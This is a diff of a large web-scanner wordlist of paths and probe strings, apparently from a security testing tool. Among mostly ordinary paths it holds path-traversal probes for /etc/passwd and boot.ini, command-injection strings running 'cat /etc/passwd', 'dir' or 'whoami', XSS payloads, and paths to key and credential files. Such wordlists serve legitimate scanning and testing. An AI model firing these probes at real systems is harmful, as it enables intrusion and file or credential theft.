-rubrique.asp?no=%60/etc/passwd%60|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;`&#039;.
-rubrique.asp?no=....//....//....//....//....//....//....//etc.passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=../../../../../../../../../etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/....../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/.../.../.../.../.../.../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/../../../../../../../../../../../../../../../../../../../../boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/../../../../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/../../../etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/.\"./.\"./.\"./.\"./.\"./boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/etc/passwd%00|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=/etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.
-rubrique.asp?no=c:\boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.
 scripts/tradecli.dll
 scripts/tradecli.dll?template=nonexistfile?template=..\..\..\..\..\winnt\system32\cmd.exe?/c+dir
 security/web_access.html
@@ -35159,7 +34909,6 @@ _private/form_results.htm
 _private/form_results.html
 _private/form_results.txt
 scripts/tools/getdrvrs.exe
-cgi-bin/webbbs/webbbs_config.pl?name=joe&email=test@example.com&body=aaaaffff&followup=10;cat%20/etc/passwd
 cgi-bin/vote.cgi
 cgi-bin/quizme.cgi
 shop/normal_html.cgi?file=../../../../../../etc/issue%00
@@ -35421,8 +35170,6 @@ README
 demo/xml/xmlquery/viewsrc/XMLQuery.jsp.txt
 soapdocs/webapps/soap/
 shopadmin.asp?Password=abc&UserName="><script>alert(foo)</script>
-phpinfo.php?GLOBALS[test]=<script>alert(document.cookie);</script>
-phpinfo.php?cx[]=JUNK(4096)<script>alert(foo)</script>
 j2ee/
 cgi-bin/printenv.tmp
 perl/printenv
@@ -37078,8 +36825,6 @@ Servlets
 Spy
 ToJSPServlet
 ViewSrc
-[
-]
 _pages/
 _pages/_demo/_ojspext/_events/_index.java
 _pages/_demo/_sql/_pages/
@@ -37216,7 +36961,6 @@ discoverer/common/help/en/connections.htm
 discoverer/intro/html/disc_demo_custom.htm
 discoverer/intro/html/disc_demo_intro.htm
 discoverer/plus
-discoverer/plus#Connect%20Directly
 discoverer/viewer
 discoverer/viewer_files/help/en/edit_parameters.htm
 dms
@@ -38019,7 +37763,6 @@ javascripts/application.js
 javascripts/prototype.js
 stylesheets/application.css
 images/rails.png
-@download@
 ADS-EJB
 ADS-License
 AE/index.jsp
@@ -47917,7 +47660,6 @@ JDWA/cgi
 Match.Site
 99
 spaceinterface/xmlConfig
-@/familymonitor
 eguo
 ysxy
 BME/frameset
@@ -52710,9 +52452,6 @@ cgi-bin/navigation
 thadmin
 ffp/fckeditor/editor/filemanager/browser/default/connectors/jsp
 ffp/UserFiles/all
-@api/host
-@api/deki/site
-@api/deki
 gd
 ueditor/net
 wjx
@@ -74238,7 +73977,6 @@ m/act/201412
 jzhbj/zxcy/chuangyou
 account/setting
 ad/Manage
-ad/@users4345435
 Article/Development/2008
 site/upload/bdata/site_20150324194659
 site/sv/gytx
@@ -78100,7 +77838,6 @@ AppService
 admin/Info
 user-modify_password
 dcp/pim
-@mmme.me
 kuwei
 web_v3
 w-
@@ -80804,7 +80541,6 @@ x.asp;(1).jpg
 aas.asa
 panda.asa
 kh.asa
-@dmin
 admin/ewebedit
 admin/ewebeditor/admin_uploadfile.asp?id=&dir=/
 ewebedit/admin_uploadfile.asp?id=&dir=//
@@ -81276,7 +81012,6 @@ airflow.cfg
 AirWatchLogin
 alpsprofile
 altair
-analyticssaw.dll?bieehome&startPage=1#grabautologincookies
 analyticssaw.dll?getPreviewImage&previewFilePath=etcpasswd
 anchorerrors.log
 ansible.cfg
@@ -81378,7 +81113,6 @@ druidindex.html
 druidindexerv1taskStatus
 eamvib?id=etcissue
 editorckeditorsamples
-emailunsubscribed?email=test@gmail.com%27\%22%3E%3Csvgonload=alert(1337)%3E
 emergency.php
 errorerror.log
 errorserrors.log
@@ -81671,7 +81405,6 @@ wp-content/plugins/mstore-api/
 wp-content/plugins/thecartpress/
 webmail/src/login.php
 simplesaml/saml2/idp
-app/kibana#
 mil
 execute-api
 admin/reset.php
@@ -82137,7 +81870,6 @@ nagios/cgi-bin/status.cgi
 fhem.cfg
 pwm/public/
 login.zul
-setup.cgi@next_file=
 apspassword
 infoviewapp
 irj/go/km/
@@ -82148,7 +81880,6 @@ LOG.txt
 _cpanel/forgotpwd
 help/lang/en/help
 public.php
-Umbraco/#/login
 config/authentication_page.htm
 certsrv/certrqus.asp
 wp-content/uploads/wp-backup-plus/
@@ -92948,7 +92679,6 @@ wp-content/.git/config
 wp-content/plugins/.git/config
 wp-content/themes/.git/config
 wp-includes/js/.git/config
-#.htaccess#
 secure/.htaccess
 ca-key.pem
 token_auth.csv
@@ -93085,7 +92815,6 @@ anon_ftpstat
 2.tar.bz2
 2.tar.gz
 2.zip
-#3ooo<ul>HI</ul>%25
 ..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 ..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
 ..%5c..%5c..%5c..%5c..%5cetc/passwd
@@ -93121,7 +92850,6 @@ Admin;/
 admin../admin
 admin/../admin
 admin/adminer.php
-admin/bootstrap.inc.php?mgp=danc3Uf@t&c=whoami
 admin/data/autosuggest
 admin/_dump/
 admin/editor/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined
@@ -93157,7 +92885,6 @@ AirWatch/Login
 ajax/app/yahoo/yahoo.htm
 alfa/
 alps/profile
-analytics/saw.dll?bieehome&startPage=1#grabautologincookies
 analytics/saw.dll?getPreviewImage&previewFilePath=/etc/passwd
 /anything/admin/
 apache-default/phpmyadmin/
@@ -93414,7 +93141,6 @@ edit/spaw2/dialogs/dialog.php
 elim/blist.xml
 .emacs.desktop
 .emacs.desktop.lock
-email/unsubscribed?email=test@gmail.com%27\%22%3E%3Csvg/onload=alert(1337)%3E
 .empty-folder
 emul.js
 engine/libs/spaw/dialogs/dialog.php
@@ -94407,3 +94133,11 @@ adminThreads
 wp-admin/about.php
 wp-admin/admin-db.php
 wp-admin/admin-header.php
+prjwebsec/xss/reflectedxss.js...
+data/reports/referringurlswithqueries when
+sources/subs-package.php 
+core/tikifilter/preventxss.php
+index.php/2012/02/foswiki-xss-vulrble/
+phpmyquote-020-version-multiple-sql-and-xss-vulne
+.cache_xqujmn.php
+phptest/xss.php
